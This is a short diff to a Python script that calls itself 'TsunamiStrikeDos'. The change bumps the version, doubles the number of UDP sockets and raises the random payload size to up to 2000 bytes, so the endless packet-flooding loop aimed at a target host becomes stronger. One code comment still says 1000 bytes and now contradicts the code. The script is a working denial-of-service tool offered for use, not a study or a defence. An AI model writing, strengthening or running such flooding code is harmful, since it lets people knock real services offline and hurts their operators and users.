@@ -13,17 +13,17 @@ print(f'''
 ⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-                {Fore.CYAN} TsunamiStrikeDos {Fore.GREEN}V 3.1 {Fore.RESET}
+                {Fore.CYAN} TsunamiStrikeDos {Fore.GREEN}V 3.2.1 {Fore.RESET}
 ''')
 
 
 # Create multiple sockets for better performance
-socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(5)]  # Create 5 UDP sockets
+socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]  # Create 10 UDP sockets
 
 def flood(target):
     while True:  # Continuous loop for sending packets
         try:
-            payload = random._urandom(random.randint(1, 1000))  # Generate random payload with size between 1 and 1000 bytes
+            payload = random._urandom(random.randint(1, 2000))  # Generate random payload with size between 1 and 1000 bytes
             sock = random.choice(socks)  # Randomly choose one of the created sockets
             sock.sendto(payload, (target[0], target[1]))  # Send the payload to the target
         except Exception as e:
